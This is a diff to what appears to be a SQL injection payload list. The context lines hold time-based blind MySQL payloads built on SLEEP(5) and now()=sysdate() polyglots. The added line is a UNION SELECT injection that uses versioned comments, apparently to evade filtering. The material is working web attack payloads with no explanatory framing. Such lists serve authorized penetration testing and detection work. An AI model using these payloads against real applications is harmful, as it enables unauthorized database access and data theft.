@@ -12,6 +12,7 @@ R(if (now()=sysdate(), sleep(5),0))OR" */
 if(now()=sysdate(), sleep(5),0)/'XOR(if (now()=sysdate(), sleep(5),0)) OR' "XOR
 (if (now()=sysdate(), sleep(5),0) and 5=5)"/
 SLEEP(5)/*' or SLEEP(5) or or SLEEP(5) or "*/
+'AND+0+/*!50000UNION*/+/*!50000SELECT*/+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--+-
 %2c(select%5*%5from%5(select(sleep(5)))a)
 (select(0)from(select(sleep(5)))v)
 (SELECT SLEEP(5))
